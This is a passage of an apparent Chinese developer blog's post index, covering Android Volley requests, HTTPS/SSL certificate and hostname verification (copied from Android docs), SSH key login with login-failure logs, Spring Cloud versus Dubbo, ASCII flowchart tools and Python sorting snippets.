private Map&lt;String, String&gt; headers; private final Map&lt;String, String&gt; params; private final Response.Listener&lt;T&gt; listener; /** * Make a POST request and return a parsed object from JSON. * * @param url URL of the request to make * @param clazz Relevant class object, for Gson's reflection * @param headers Map of request headers * @param headers Map of request json body */ public GsonRequest(String url, Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; body, Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener) &#123; super(Method.POST, url, errorListener); this.clazz = clazz; this.headers = headers; this.params = body; this.listener = listener; &#125; public GsonRequest(int type,String url, Class&lt;T&gt; clazz, Map&lt;String, String&gt; headers, Map&lt;String, String&gt; params, Response.Listener&lt;T&gt; listener, Response.ErrorListener errorListener) &#123; super(type, url, errorListener); this.clazz = clazz; this.headers = headers; this.params = params; this.listener = listener; &#125; @Override public byte[] getBody()&#123; byte[] body = null; if(params!=null) &#123; JSONObject jsonObject = new JSONObject(params); body = jsonObject.toString().getBytes(); &#125; return body; &#125; @Override public Map&lt;String, String&gt; getHeaders() throws AuthFailureError &#123; if(headers == null)&#123; headers = new HashMap&lt;&gt;(); &#125; headers.put(\"Content-Type\",\"application/json\"); return headers; &#125; @Override protected void deliverResponse(T response) &#123; listener.onResponse(response); &#125; @Override protected Response&lt;T&gt; parseNetworkResponse(NetworkResponse response) &#123; try &#123; String json = new String( response.data, HttpHeaderParser.parseCharset(response.headers)); return Response.success( gson.fromJson(json, clazz), HttpHeaderParser.parseCacheHeaders(response)); &#125; catch (UnsupportedEncodingException e) &#123; return Response.error(new ParseError(e)); &#125; catch (JsonSyntaxException e) &#123; return Response.error(new ParseError(e)); &#125; &#125;&#125; 调用：12345678910111213141516171819public void login(String username, String passwd, Response.Listener&lt;LoginBean&gt; listener, Response.ErrorListener error)&#123; final String url = BASE_URL + \"/api/users/login\"; Map&lt;String ,String &gt;params = new HashMap&lt;&gt;(); params.put(\"email\",username); params.put(\"password\", passwd); GsonRequest&lt;LoginBean&gt; gsonRequest = new GsonRequest&lt;&gt;( url, LoginBean.class, null, params, listener, error); requestQueue.add(request);&#125; 123456789101112131415161718192021public class LoginBean &#123; private int code; private String token; public int getCode() &#123; return code; &#125; public void setCode(int code) &#123; this.code = code; &#125; public String getToken() &#123; return token; &#125; public void setToken(String token) &#123; this.token = token; &#125;&#125; 使用起来就很方便了，监听响应结果。 1234@Overridepublic void onResponse(LoginBean response) &#123; Log.d(TAG, \"onResponse: \"+response.getToken());&#125;","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Android通过 HTTPS 和 SSL 确保安全.md","slug":"Android/Android通过 HTTPS 和 SSL 确保安全","date":"2018-04-27T11:52:36.000Z","updated":"2021-12-28T03:24:10.115Z","comments":true,"path":"Android/Android通过 HTTPS 和 SSL 确保安全/","link":"","permalink":"http://yoursite.com/Android/Android通过 HTTPS 和 SSL 确保安全/","excerpt":"","text":"摘录: https://developer.android.google.cn/training/articles/security-ssl 安全套接字层 (SSL)（现在技术上称为传输层安全协议 (TLS)）是一个通用构建块，用于在客户端与服务器之间进行加密通信。应用很可能以错误的方式使用 SSL，从而导致恶意实体能够拦截网络上的应用数据。为了帮助您确保您的应用不会出现这种情况，本文重点介绍了使用安全网络协议的常见陷阱，并解决对使用公钥基础结构 (PKI) 关注较多的问题。 概念在典型的 SSL 使用场景中，会使用一个包含公钥及与其匹配的私钥的证书配置服务器。作为 SSL 客户端与服务器握手的一部分，服务器将通过使用公钥加密签署其证书来证明自己具有私钥。 不过，任何人都可以生成他们自己的证书和私钥，因此，一个简单的握手只能说明服务器知道与证书公钥匹配的私钥，除此之外什么都证明不了。解决此问题的一个方法是让客户端拥有其信任的一个或多个证书集。如果证书不在此集合中，则不会信任服务器。 但这个简单的方法有几个缺点。服务器应能够随时间的推移升级到更强的密钥（“密钥旋转”），使用新的公钥替换证书中的公钥。遗憾的是，客户端应用现在必须根据服务器配置发生的变化进行更新。如果服务器不在应用开发者的控制下（例如，如果服务器是一个第三方网络服务），则很容易出现问题。如果应用必须与网络浏览器或电子邮件应用等任意服务器通信，那么，此方法也会带来问题。 为弥补这些缺点，通常使用来自知名颁发者（称为证书颁发机构 (CA)）发放的证书配置服务器。主机平台一般包含其信任的知名 CA 的列表。从 Android 4.2 (Jelly Bean) 开始，Android 目前包含在每个版本中更新的 100 多个 CA。CA 具有一个证书和一个私钥，这点与服务器相似。为服务器发放证书时，CA 使用其私钥签署服务器证书。然后，客户端可以验证该服务器是否具有平台已知的 CA 发放的证书。 不过，在解决一些问题的同时，使用 CA 也会引发其他问题。因为 CA 为许多服务器发放证书，因此，您仍需要某种方式来确保您与您需要的服务器通信。为解决这个问题，CA 发放的证书通过 gmail.com 等具体名称或 *.google.com 等通配型主机集识别服务器。 以下示例会让这些概念更具体。下面的代码段来自命令行，openssl 工具的 s_client 命令将查看 Wikipedia 的服务器证书信息。它指定端口 443，因为此端口是 HTTPS的默认端口。此命令将 openssl s_client 的输出发送到 openssl x509，后者将根据 X.509 标准格式化与证书有关的信息。具体而言，此命令会要求相关主题，主题包含服务器名称信息和可识别 CA 的颁发者。 123$ openssl s_client -connect wikipedia.org:443 | openssl x509 -noout -subject -issuersubject= /serialNumber=sOrr2rKpMVP70Z6E9BT5reY008SJEdYv/C=US/O=*.wikipedia.org/OU=GT03314600/OU=See www.rapidssl.com/resources/cps (c)11/OU=Domain Control Validated - RapidSSL(R)/CN=*.wikipedia.orgissuer= /C=US/O=GeoTrust, Inc./CN=RapidSSL CA 您会看到证书是由 RapidSSL CA 为与 *.wikipedia.org 匹配的服务器发放的。 一个 HTTPS 示例假设您有一个由知名 CA 发放证书的网络服务器，那么，您可以使用如下简单代码发起安全的请求： 1234URL url = new URL(\"https://wikipedia.org\");URLConnection urlConnection = url.openConnection();InputStream in = urlConnection.getInputStream();copyInputStreamToOutputStream(in, System.out); 没错，就这么简单。如果您要调整 HTTP 请求，您可以切换到 HttpURLConnection。有关 HttpURLConnection 的 Android 文档就如何处理请求和响应标头，以及如何发布内容、管理 Cookie、使用代理、缓存响应等提供了更多示例。但对于验证证书和主机名的细节，Android 框架在 API 中为您考虑了这些细节。这些是您尽可能想要实现的目标。不过，下面还有一些其他注意事项。 验证服务器证书的常见问题假设没有从 getInputStream() 接收内容，将引发异常： 12345678910javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found. at org.apache.harmony.xnet.provider.jsse.OpenSSLSocketImpl.startHandshake(OpenSSLSocketImpl.java:374) at libcore.net.http.HttpConnection.setupSecureSocket(HttpConnection.java:209) at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.makeSslConnection(HttpsURLConnectionImpl.java:478) at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.connect(HttpsURLConnectionImpl.java:433) at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:290) at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:240) at libcore.net.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:282) at libcore.net.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:177) at libcore.net.http.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:271) 出现此情况的原因有很多，其中包括： 颁发服务器证书的 CA 未知 服务器证书不是由 CA 签署的，而是自签署 服务器配置缺少中间 CA 下面几部分将讨论如何解决这些问题，同时保持与服务器的连接处于安全状态。 未知的证书颁发机构在这种情况下，由于您具有系统不信任的 CA，将发生 SSLHandshakeException。原因可能是您有一个来自 Android 还未信任的新 CA 的证书，或您的应用在没有 CA 的较旧版本上运行。CA 未知的原因通常是因为它不是公共 CA，而是政府、公司或教育机构等组织发放的仅供自己使用的私有 CA。 幸运的是，您可以指示 HttpsURLConnection 信任特定的 CA 集。此过程可能有点复杂，下面的示例展示了这个过程，从 InputStream 获取一个特定的 CA，用该 CA 创建 KeyStore，然后用后者创建和初始化 TrustManager。TrustManager 是系统用于从服务器验证证书的工具，可以使用一个或多个 CA 从 KeyStore 创建，而创建的 TrustManager 将仅信任这些 CA。 如果是新的 TrustManager，此示例将初始化一个新的 SSLContext，后者可以提供一个 SSLSocketFactory，您可以通过 HttpsURLConnection 用它来替换默认的 SSLSocketFactory。这样一来，连接将使用您的 CA 验证证书。 下面是使用华盛顿大学的机构 CA 的完整示例： 1234567891011121314151617181920212223242526272829303132333435// Load CAs from an InputStream// (could be from a resource or ByteArrayInputStream or ...)CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");// From https://www.washington.edu/itconnect/security/ca/load-der.crtInputStream caInput = new BufferedInputStream(new FileInputStream(\"load-der.crt\"));Certificate ca;try &#123; ca = cf.generateCertificate(caInput); System.out.println(\"ca=\" + ((X509Certificate) ca).getSubjectDN());&#125; finally &#123; caInput.close();&#125;// Create a KeyStore containing our trusted CAsString keyStoreType = KeyStore.getDefaultType();KeyStore keyStore = KeyStore.getInstance(keyStoreType);keyStore.load(null, null);keyStore.setCertificateEntry(\"ca\", ca);// Create a TrustManager that trusts the CAs in our KeyStoreString tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();TrustManagerFactory tmf = TrustManagerFactory.getInstance(tmfAlgorithm);tmf.init(keyStore);// Create an SSLContext that uses our TrustManagerSSLContext context = SSLContext.getInstance(\"TLS\");context.init(null, tmf.getTrustManagers(), null);// Tell the URLConnection to use a SocketFactory from our SSLContextURL url = new URL(\"https://certs.cac.washington.edu/CAtest/\");HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();urlConnection.setSSLSocketFactory(context.getSocketFactory());InputStream in = urlConnection.getInputStream();copyInputStreamToOutputStream(in, System.out); 借助一个知道您的 CA 的自定义 TrustManager，系统能够验证您的服务器证书是否来自值得信任的颁发者。 注意：许多网站都会介绍一个糟糕的替代解决方案，让您安装一个没用的 TrustManager。如果您这样做还不如不加密通信，因为任何人都可以在公共 WLAN 热点下，使用伪装成您的服务器的代理发送您的用户流量，通过 DNS 欺骗攻击您的用户。然后，攻击者可以记录密码和其他个人数据。此方法之所以有效是因为攻击者可以生成一个证书，且没有可以切实验证证书是否来自值得信任的来源的 TrustManager，从而使您的应用可与任何人通信。因此，不要这样做，暂时性的也不行。如果您可以始终让您的应用信任服务器证书的颁发者，那就这样做吧。 自签署的服务器证书导致出现 SSLHandshakeException 的第二种情况是自签署证书，表示服务器将按照自己的 CA 进行操作。这与证书颁发机构未知的情况相似，因此，您可以使用前面部分介绍的方法。 您可以创建自己的 TrustManager，这次直接信任服务器证书。这种方法具有前面所述的将应用与证书直接关联的所有弊端，但可以安全地操作。不过，您应谨慎为之，以确保您的自签署证书具有合理的强密钥。从 2012 年开始，可以接受一个指数为 65537 的 2048 位 RSA 签名，此签名的有效期为一年。旋转密钥时，您应查看颁发机构（例如 NIST）针对可接受的密钥提供的建议。 缺少中间证书颁发机构导致出现 SSLHandshakeException 的第三种情况是缺少中间 CA。大多数公共 CA 不直接签署服务器证书。相反，它们使用自己的主要 CA 证书（称为根 CA）签署中间 CA。这样一来，根 CA 可以离线存储，从而降低泄露风险。不过，Android 等操作系统通常仅直接信任根 CA，这会在服务器证书（由中间 CA 签署）与证书验证程序（了解根 CA）之间留下一个小的信任缺口。为了解决这个问题，服务器在 SSL 握手期间不会仅向客户端发送它的证书，而是发送一个证书链，包括服务器 CA 以及到达可信的根 CA 所需要的任意中间证书。 要了解其实际应用，请看一下通过 openssl s_client 命令查看的 mail.google.com 证书链： 12345678$ openssl s_client -connect mail.google.com:443---Certificate chain 0 s:/C=US/ST=California/L=Mountain View/O=Google Inc/CN=mail.google.com i:/C=ZA/O=Thawte Consulting (Pty) Ltd./CN=Thawte SGC CA 1 s:/C=ZA/O=Thawte Consulting (Pty) Ltd./CN=Thawte SGC CA i:/C=US/O=VeriSign, Inc./OU=Class 3 Public Primary Certification Authority--- 这表明服务器会为 mail.google.com 发送一个由 Thawte SGC CA（中间 CA）发放的证书，同时为 Thawte SGC CA 发送一个由 Verisign CA（Android 信任的主要 CA）发放的证书。 不过，对服务器进行配置以便不添加必要的中间 CA 也是屡见不鲜。例如，下面的服务器会引发 Android 浏览器错误和 Android 应用异常：123456$ openssl s_client -connect egov.uscis.gov:443---Certificate chain 0 s:/C=US/ST=District Of Columbia/L=Washington/O=U.S. Department of Homeland Security/OU=United States Citizenship and Immigration Services/OU=Terms of use at www.verisign.com/rpa (c)05/CN=egov.uscis.gov i:/C=US/O=VeriSign, Inc./OU=VeriSign Trust Network/OU=Terms of use at https://www.verisign.com/rpa (c)10/CN=VeriSign Class 3 International Server CA - G3--- 有趣的是，在大多数桌面浏览器中访问此服务器不会引发完全未知的 CA 或自签署服务器证书所引发的类似错误。这是因为大多数桌面浏览器都会将可信的中间 CA 缓存一段时间。当浏览器从某个网站访问和了解中间 CA 后，下次它就不需要将中间 CA 添加在证书链中。 有些网站会专门为提供资源的辅助网络服务器这样做。例如，他们可能让具有完整证书链的服务器提供主 HTML 页面，让不包含 CA 的服务器提供图像、CSS 或 JavaScript 等资源，以节省带宽。遗憾的是，这些服务器有时候可能会提供您正在尝试从 Android 应用调用的网络服务，这一点让人难以接受。 可以通过两种方法解决此问题： 配置服务器以便在服务器链中添加中间 CA。大多数 CA 都可以提供有关如何为所有常用网络服务器执行此操作的文档。如果您需要网站至少通过 Android 4.2 使用默认 Android 浏览器，那么这是唯一的方法。 或者，像对待其他任何未知 CA 一样对待中间 CA，并创建一个 TrustManager 以直接信任它，如前面的两部分中所述。 主机名验证的常见问题正如本文开头所述，验证 SSL 连接有两个关键环节。首先是验证证书是否来自值得信任的来源，这是前面部分重点讲述的内容。而此部分侧重于第二个环节：确保您正在通信的服务器提供正确的证书。如果没有提供，您通常会看到类似于下面的错误： 12345678ava.io.IOException: Hostname 'example.com' was not verified at libcore.net.http.HttpConnection.verifySecureSocketHostname(HttpConnection.java:223) at libcore.net.http.HttpsURLConnectionImpl$HttpsEngine.connect(HttpsURLConnectionImpl.java:446) at libcore.net.http.HttpEngine.sendSocketRequest(HttpEngine.java:290) at libcore.net.http.HttpEngine.sendRequest(HttpEngine.java:240) at libcore.net.http.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:282) at libcore.net.http.HttpURLConnectionImpl.getInputStream(HttpURLConnectionImpl.java:177) at libcore.net.http.HttpsURLConnectionImpl.getInputStream(HttpsURLConnectionImpl.java:271) 出现此错误的一个原因是服务器配置错误。配置服务器所使用的证书不具有与您尝试连接的服务器匹配的主题或主题备用名称字段。许多不同的服务器可能使用一个证书。例如，使用 openssl s_client -connect google.com:443 | openssl x509 -text 查看 google.com 证书，您不仅可以看到一个支持 .google.com 的主题，而且还能看到适用于 .youtube.com、*.android.com 等的主题备用名称。仅当您要连接的服务器名称没有被证书列为可接受时才会发生这种错误。 不幸的是，还有另外一个原因也会引发此错误，即虚拟托管。当多个使用 HTTP 的主机名共享服务器时，网络服务器可以通过 HTTP/1.1 请求识别客户端正在寻找哪个目标主机名。遗憾的是，使用 HTTPS 会使情况变得复杂，因为服务器必须在看到 HTTP 请求前知道返回哪个证书。为了解决此问题，较新的 SSL 版本（特别是 TLSv.1.0 及更高版本）支持服务器名称指示 (SNI)，后者允许 SSL 客户端向服务器指定预期的主机名，以便可以返回正确的证书。 幸运的是，自 Android 2.3 开始，HttpsURLConnection 就支持 SNI。如果您需要支持 Android 2.2（及更旧的版本），一种解决办法是在一个唯一端口上设置备用虚拟主机，以便了解要返回哪个服务器证书。 比较极端的替代方法是不使用服务器默认情况下返回的验证程序，而是将 HostnameVerifier 替换为不使用您的虚拟机主机名的验证程序。 注意：如果其他虚拟主机不在您的控制之下，则更换 HostnameVerifier 非常危险，因为中间人攻击会在您不知情的情况下将流量引向其他服务器。 如果您仍确定要替换主机名验证，请看下面的示例，它将针对单个 URLConnection 的验证程序替换为确认主机名至少符合应用预期的验证程序： 12345678910111213141516171819// Create an HostnameVerifier that hardwires the expected hostname.// Note that is different than the URL's hostname:// example.com versus example.orgHostnameVerifier hostnameVerifier = new HostnameVerifier() &#123; @Override public boolean verify(String hostname, SSLSession session) &#123; HostnameVerifier hv = HttpsURLConnection.getDefaultHostnameVerifier(); return hv.verify(\"example.com\", session); &#125;&#125;;// Tell the URLConnection to use our HostnameVerifierURL url = new URL(\"https://example.org/\");HttpsURLConnection urlConnection = (HttpsURLConnection)url.openConnection();urlConnection.setHostnameVerifier(hostnameVerifier);InputStream in = urlConnection.getInputStream();copyInputStreamToOutputStream(in, System.out); 但请记住，如果您发现自己更换了主机名验证，特别是因虚拟托管引起的更换，那么，当其他虚拟主机不在您的控制之下时，这样做仍非常危险，您应找到一个可以避免此问题的备用托管安排。 有关直接使用 SSLSocket 的警告到目前为止，所举示例都是侧重于使用 HttpsURLConnection 的 HTTPS。有时候应用需要单独使用 SSL与 HTTP。例如，某个电子邮件应用可能使用 SSL 的变体 SMTP、POP3 或 IMAP。在这些情况下，应用将需要直接使用 SSLSocket，与 HttpsURLConnection 在内部执行的操作非常相似。 目前为止所介绍的用于处理证书验证问题的技术也适用于 SSLSocket。事实上，使用自定义 TrustManager 时，传递到 HttpsURLConnection 的是 SSLSocketFactory。因此，如果您需要使用一个带有 SSLSocket 的自定义 TrustManager，请遵循相同的步骤，并使用 SSLSocketFactory 创建您的 SSLSocket。 注意：SSLSocket 不会执行主机名验证。由您的应用执行自己的主机名验证，最好通过使用预期的主机名调用 getDefaultHostnameVerifier() 进行验证。另外，请注意，出现错误时，HostnameVerifier.verify() 不会引发异常，而是返回一个布尔结果，您必须明确地检查该结果。 以下示例向您展示了如何执行此操作。该示例显示在没有 SNI 支持的情况下连接到 gmail.com 端口 443 时，您将收到 mail.google.com 的证书。在此情况下，这正是期待的结果，因此，请执行检查以确保证书确实是 mail.google.com 的证书： 123456789101112131415161718// Open SSLSocket directly to gmail.comSocketFactory sf = SSLSocketFactory.getDefault();SSLSocket socket = (SSLSocket) sf.createSocket(\"gmail.com\", 443);HostnameVerifier hv = HttpsURLConnection.getDefaultHostnameVerifier();SSLSession s = socket.getSession();// Verify that the certicate hostname is for mail.google.com// This is due to lack of SNI support in the current SSLSocket.if (!hv.verify(\"mail.google.com\", s)) &#123; throw new SSLHandshakeException(\"Expected mail.google.com, \" \"found \" + s.getPeerPrincipal());&#125;// At this point SSLSocket performed certificate verificaiton and// we have performed hostname verification, so it is safe to proceed.// ... use socket ...socket.close(); 列入黑名单为了仅向正确验证的服务器和域的所有者发放证书，SSL 非常依赖 CA。少数情况下，CA 也会受骗，如 Comodo 和 DigiNotar 出现了信息泄露，从而导致某个主机名的证书被发放给服务器或域的所有者以外的其他人。 为了降低此风险，Android 提供了将某些证书甚至整个 CA 列入黑名单的功能。尽管此名单过去已内置到操作系统中，但从 Android 4.2 开始，可以远程更新此名单，便于处理将来的泄露问题。 证书固定通过名称为证书固定的技术，应用可以更好地保护自己免受以欺诈方式发放的证书的攻击。这里基本上使用上面未知 CA 案例中提供的示例，将应用的可信 CA 限制在一个很小的 CA 集范围内，应用的服务器将使用这个集合。这样可以防止因泄露系统中其他 100 多个 CA 中的某个 CA 而破坏应用安全通道。 客户端证书本文重点讲述 SSL 用户与服务器进行安全通信。SSL 也支持客户端证书的概念，客户端证书允许服务器验证客户端的身份。尽管这超出了本文的讨论范围，但使用的技术与指定自定义 TrustManager 相似。请在 HttpsURLConnection 的相关文档中查看有关创建自定义 KeyManager 的讨论。 Nogotofail：网络流量安全测试工具 对于已知的 TLS/SSL 漏洞和错配置，可以通过 Nogotofail 轻松确认您的应用程序是否安全。它是一款自动执行的工具，功能强大并且可扩展，用于测试通过它传送网络流量的任意设备的网络安全问题。 Nogotofail 可用于三个主要用例： 123查找错误和漏洞。验证修复并监测回归。了解哪些应用和设备正在生成哪些流量。 Nogotofail 适用于 Android、iOS、Linux、Windows、Chrome 操作系统、OSX。事实上，任何用于连接互联网的设备都可以使用 Nogotofail。在 Android 和 Linux 上提供了一个易于使用的客户端来配置设置和获取通知，同时还提供了一个本身可作为路由器、VPN 服务器或代理部署的攻击引擎。 您可以在 Nogotofail 开源项目网站上访问此工具。","categories":[{"name":"Android","slug":"Android","permalink":"http://yoursite.com/categories/Android/"}],"tags":[]},{"title":"Nogotofail网络流量安全测试工具","slug":"Linux/Nogotofail网络流量安全测试工具","date":"2018-04-26T11:52:36.000Z","updated":"2018-04-26T11:52:36.000Z","comments":true,"path":"Linux/Nogotofail网络流量安全测试工具/","link":"","permalink":"http://yoursite.com/Linux/Nogotofail网络流量安全测试工具/","excerpt":"","text":"对于已知的 TLS/SSL 漏洞和错配置，可以通过 Nogotofail 轻松确认您的应用程序是否安全。它是一款自动执行的工具，功能强大并且可扩展，用于测试通过它传送网络流量的任意设备的网络安全问题。 Nogotofail 可用于三个主要用例： 查找错误和漏洞。 验证修复并监测回归。 了解哪些应用和设备正在生成哪些流量。 Nogotofail 适用于 Android、iOS、Linux、Windows、Chrome 操作系统、OSX。事实上，任何用于连接互联网的设备都可以使用 Nogotofail。在 Android 和 Linux 上提供了一个易于使用的客户端来配置设置和获取通知，同时还提供了一个本身可作为路由器、VPN 服务器或代理部署的攻击引擎。 您可以在 Nogotofail 开源项目网站上访问此工具。 摘自：https://developer.android.google.cn/training/articles/security-ssl","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"UI标注和切图","slug":"前端/UI标注和切图","date":"2018-04-09T13:54:53.000Z","updated":"2021-12-28T03:24:10.250Z","comments":true,"path":"前端/UI标注和切图/","link":"","permalink":"http://yoursite.com/前端/UI标注和切图/","excerpt":"","text":"标你妹地址在线，自动生成标注，上传psd自动生成标注。 蓝湖地址在线，自动生成标注/切图，还有原型制作/逻辑连线，支持Sketch 和 Photoshop 设计图，通过插件上传即可实现自动标注。","categories":[],"tags":[]},{"title":"SpringCloud和Dubbo如何选择","slug":"SpringCloud/SpringCloud和Dubbo如何选择","date":"2018-04-03T04:52:36.000Z","updated":"2021-12-28T03:24:10.197Z","comments":true,"path":"SpringCloud/SpringCloud和Dubbo如何选择/","link":"","permalink":"http://yoursite.com/SpringCloud/SpringCloud和Dubbo如何选择/","excerpt":"","text":"摘：可能很多人正在犹豫，在服务治理的时候应该选择那个框架呢？如果公司对效率有极高的要求建议使用 Dubbo，相对比 RPC 的效率会比 HTTP 高很多；如果团队不想对技术架构做大的改造建议使用 Dubbo，Dubbo 仅仅需要少量的修改就可以融入到内部系统的架构中。但如果技术团队喜欢挑战新技术，建议选择 Spring Cloud，Spring Cloud 架构体系有有趣很酷的技术。如果公司选择微服务架构去重构整个技术体系，那么 Spring Cloud 是当仁不让之选，它可以说是目前最好的微服务框架没有之一。——出自《阿里Dubbo疯狂更新，关Spring Cloud什么事？》 Dubbo性能高（RPC ），轻量级，设计的也很自由，开发者可以各种DIY，比如，他的注册中心，甚至可以用Redis来做。 Spring Cloud 是一个生态，要使用各种组件来组成整个服务，因为服务之间是基于HTTP通讯的，所以没有RPC 那么高效率，求的是一个稳。 总结：中小型项目可以用Dubbo来快速实现，而且现在Dubbo已经支持SpringBoot。 长期发展（扩展）的项目，Spring Cloud是一个不错的选择。","categories":[{"name":"SpringCloud","slug":"SpringCloud","permalink":"http://yoursite.com/categories/SpringCloud/"}],"tags":[]},{"title":"SpringCloud学习资料整理","slug":"SpringCloud/SpringCloud学习资料整理","date":"2018-04-03T04:52:36.000Z","updated":"2021-12-28T03:24:10.198Z","comments":true,"path":"SpringCloud/SpringCloud学习资料整理/","link":"","permalink":"http://yoursite.com/SpringCloud/SpringCloud学习资料整理/","excerpt":"","text":"spring-cloud-examples Github SpringCloud入门系列(第 001 篇) 博客 Spring Cloud入门到实战系列教程(猿天地尹吉欢) 博客 Java生态研究(Spring Boot + Redis + Dubbo + RocketMQ) Github 基于Spring+SpringMVC+Mybatis分布式敏捷开发系统架构(参考实战) Github spring cloud 脚手架 Github","categories":[{"name":"SpringCloud","slug":"SpringCloud","permalink":"http://yoursite.com/categories/SpringCloud/"}],"tags":[]},{"title":"SpringBoot学习资料整理","slug":"SpringBoot/SpringBoot学习资料整理","date":"2018-04-03T04:52:36.000Z","updated":"2021-12-28T03:24:10.192Z","comments":true,"path":"SpringBoot/SpringBoot学习资料整理/","link":"","permalink":"http://yoursite.com/SpringBoot/SpringBoot学习资料整理/","excerpt":"","text":"spring-boot-examples Github spring-boot-quick Github 基于springboot的快速学习示例,整合各种LZ遇到的开源框架,如： rabbitmq、jpa、redies、oauth2、swagger、jsp、docker、spring-batch、异常处理、日志输出、多模块开发、多环境打包等等","categories":[{"name":"SpringBoot","slug":"SpringBoot","permalink":"http://yoursite.com/categories/SpringBoot/"}],"tags":[]},{"title":"ASCII 流程图生成方法","slug":"Linux/ASCII流程图","date":"2018-03-28T14:52:36.000Z","updated":"2021-12-28T03:24:10.160Z","comments":true,"path":"Linux/ASCII流程图/","link":"","permalink":"http://yoursite.com/Linux/ASCII流程图/","excerpt":"","text":"markdown文档很多时候要流程图，不用图片，用字符就可以显示，如： 123+--------+ request +--------+| client | ---------&gt; | server |+--------+ +--------+ 那么如何画这种图？ Easy DSL的语法描述图像12345678910111213141516171819202122$ apt-get install libgraph-easy-perl$$ graph-easy &lt;&lt;&lt; '[ client ] - request -&gt; [ server ]'+--------+ request +--------+| client | ---------&gt; | server |+--------+ +--------+$$$$ vim simple.txt[ A ], [ B ], [ C ] --&gt; [ D ]$$ graph-easy simple.txt+---+ +---+ +---+| A | --&gt; | D | &lt;-- | C |+---+ +---+ +---+ ^ | | +---+ | B | +---+ Easy DSL的语法 Easy DSL的语法 图形工具此 asciiflow 网站提供在线画图。","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"md","slug":"md","permalink":"http://yoursite.com/tags/md/"}]},{"title":"SSH公钥免密码登录","slug":"Linux/SSH免密码登录","date":"2018-03-28T14:52:36.000Z","updated":"2021-12-28T03:24:10.168Z","comments":true,"path":"Linux/SSH免密码登录/","link":"","permalink":"http://yoursite.com/Linux/SSH免密码登录/","excerpt":"","text":"环境： 客户机Winows 服务器Linux (192.168.0.66) 操作 客户端公钥 一般安装了Git，本地都有ssh公钥，在目录 C:\\Users\\xxx\\.ssh (即 ~/.ssh )下如果没有，执行ssh-keygen生成。 上传公钥 12$ ssh-copy-id -i ~/.ssh/id_rsa.pub root@192.168.0.66root的密码： 免密码登录 ssh登录1$ ssh root@192.168.0.66 scp拷贝文件1$ scp -r ./test/* root@192.168.0.66:/data/test 删除公钥 登录服务器 vim ~/.ssh/authorized_keys 删除你的公钥 查看SSH登录日志12345678910111213141516171819202122# 显示近期用户或终端的登录情况，实际是查看 /var/log/wtmp 这个文件$ lastroot pts/0 192.168.0.30 Tue Oct 12 11:42 - 15:35 (03:53)root pts/0 192.168.0.30 Mon Oct 11 14:32 - 14:33 (00:01)root pts/0 192.168.0.30 Mon Oct 11 14:25 - 14:27 (00:02)# 显示用户登录失败的列表，实际是查看 /var/log/btmp 这个文件$ lastbuftp ssh:notty 106.52.137.228 Sun Oct 3 13:55 - 13:55 (00:00)uftp ssh:notty 106.52.137.228 Sun Oct 3 12:10 - 12:10 (00:00)uftp ssh:notty 106.52.137.228 Sun Oct 3 12:10 - 12:10 (00:00)ftp ssh:notty 106.52.137.228 Sun Oct 3 09:33 - 09:33 (00:00)ftp ssh:notty 106.52.137.228 Sun Oct 3 09:33 - 09:33 (00:00)nagios ssh:notty 106.52.137.228 Sun Oct 3 07:14 - 07:14 (00:00)nagios ssh:notty 106.52.137.228 Sun Oct 3 07:14 - 07:14 (00:00)mysql ssh:notty 106.52.137.228 Sun Oct 3 00:36 - 00:36 (00:00)oracle ssh:notty 106.52.137.228 Sat Oct 2 23:27 - 23:27 (00:00)oracle ssh:notty 106.52.137.228 Sat Oct 2 23:27 - 23:27 (00:00)oracle ssh:notty 106.52.137.228 Sat Oct 2 22:17 - 22:17 (00:00)oracle ssh:notty 106.52.137.228 Sat Oct 2 22:17 - 22:17 (00:00)# 以上的记录是被攻击了？？？","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"md","slug":"md","permalink":"http://yoursite.com/tags/md/"}]},{"title":"Python测试代码","slug":"Python/Python测试代码","date":"2018-03-27T13:52:36.000Z","updated":"2018-03-27T13:52:36.000Z","comments":true,"path":"Python/Python测试代码/","link":"","permalink":"http://yoursite.com/Python/Python测试代码/","excerpt":"","text":"截取字符串123str = \"ABCDEFGFEE03\"print (str[10:12])# 输出：03 分割字符串取倒数第一个123str = \"HELLO6CF51D000003\"print(str.split('0000')[-1])# 输出：03 列表中的字符串排序语法：list.sort(key=None, reverse=False) ，【参考】 Int型排序1234a = [5, 2, 3, 1, 4]a.sort()print(a)# 输出：[1, 2, 3, 4, 5] 字符默认排序123456import relist = ['123', 'Google', 'Runoob', 'Taobao', 'Facebook'];list.sort()print(list)# 输出：['123', 'Facebook', 'Google', 'Runoob', 'Taobao'] 表达式排序123456import relist = ['ch1.txt', 'ch3.txt', 'ch9.txt', 'ch10.txt', 'ch11.txt']list.sort(key = lambda x:int(re.match('\\D+(\\d+)\\.txt',x).group(1)))print(list)# 输出：['ch1.txt', 'ch3.txt', 'ch9.txt', 'ch10.txt', 'ch11.txt'] 自定义排序 按照字符尾数数字排序 1234567list = [\"HEADF84300000A\",\"HEAD97AB000009\",\"HEADF51D000003\",\"HEAD7952000002\"]# 方法一： 按照截取位置最后6位字符转 Int 16进制来排序# list.sort(key=lambda x:int(x[8:14],16))# 方法二： 按照'0000'分割，取最后2位转 Int 16进制来排序list.sort(key=lambda 